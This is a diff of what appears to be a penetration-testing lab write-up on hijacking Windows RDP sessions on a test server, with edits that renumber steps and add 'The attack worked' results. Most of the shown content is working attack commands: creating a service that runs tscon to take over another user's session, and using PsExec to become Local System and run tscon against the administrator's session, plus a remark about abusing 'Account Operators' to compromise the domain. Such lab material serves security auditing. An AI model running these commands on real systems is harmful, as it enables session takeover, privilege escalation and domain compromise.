@@ -46,11 +46,10 @@ The domain account 'LAB\HelpdeskSupport' is a valuable target beacause it is mem
 
 
 ------------------------------------------------------------------------------------------------------------------------
-Step 1 - Log into a remote Windows server '192.168.50.25' (RDP) with domain account auditor 'LAB\auditor' 
+Step 2 - Log into the remote Windows server '192.168.50.25' (RDP) with domain account auditor 'LAB\auditor' 
 ------------------------------------------------------------------------------------------------------------------------
 
-Once logged, we can use locally the command 'query user' to confimr the list of available sessions.
-In this example we use the domain account 'LAB\auditor' which has local admin privileges on the remote Windows server.
+Once logged, we can use locally the command 'query user' to confim the list of available sessions.
 
 C:\Users\Auditor> query user
  USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
@@ -68,11 +67,16 @@ C:\Users\Auditor> sc create svcrdpsessionhijack binpath="cmd.exe /k tscon 3 /des
 
 C:\Users\Auditor> net start svcrdpsessionhijack
 
+Result
+-------
+The attack worked !!
 > We have now full access to the RDP session of the higly privileged account 'LAB\HelpdeskSupport'.
+> We can impersonate him and (in our example) abuse the privileges of the domain group "Account Operators" to compromise the Windows domain.
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------
-Step 3 Bis - Use PsExec to become Local System and then run TSCON to hijack the session of the local 'administrator' account
---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+Step 4 (Other attack) - Use PsExec to become Local System and then run TSCON to hijack the session of the local 'administrator' account
+-----------------------------------------------------------------------------------------------------------------------------------------
 
 C:\Users\Auditor\Desktop> PsExec64.exe -s -i cmd.exe
 
@@ -82,4 +86,7 @@ Sysinternals - www.sysinternals.com
 
 C:\Windows\system32> tscon 2 /dest:rdp-tcp#3
 
+Result
+-------
+The attack worked !!
 > We have now full access to the RDP session of the local 'administrator' account.
